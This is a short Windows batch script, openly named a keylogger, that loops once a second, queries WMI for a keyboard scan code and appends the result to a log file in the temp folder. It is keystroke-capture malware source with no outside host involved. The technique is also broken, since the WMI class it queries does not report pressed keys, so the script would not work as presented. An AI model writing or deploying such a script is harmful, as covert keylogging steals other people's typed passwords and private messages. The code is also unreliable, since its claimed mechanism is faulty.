@echo off
setlocal EnableDelayedExpansion

set "logfile=%TEMP%\keylogger.txt"

:listen
timeout /t 1 /nobreak >nul
for /f "tokens=2 delims=," %%A in ('"wmic path Win32_Keyboard get ScanCode"') do (
    set "key=%%A"
)
if not "%key%"=="" (
    echo !key!>>"%logfile%"
)
goto listen
